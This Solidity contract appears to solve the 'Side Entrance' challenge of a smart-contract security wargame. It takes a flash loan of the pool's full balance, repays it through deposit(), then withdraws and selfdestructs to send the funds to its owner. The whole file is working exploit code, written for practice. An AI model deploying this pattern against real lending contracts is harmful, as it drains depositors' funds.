// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./SideEntranceLenderPool.sol";

contract Attacker {
    address payable owner;
    SideEntranceLenderPool pool;

    constructor(address poolAddress) {
        pool = SideEntranceLenderPool(poolAddress);
        owner = payable(msg.sender);
    }

    function execute() public payable {
        pool.deposit{value: msg.value}();
    }

    function attack() public {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        selfdestruct(owner);
    }

    receive() external payable {}
}
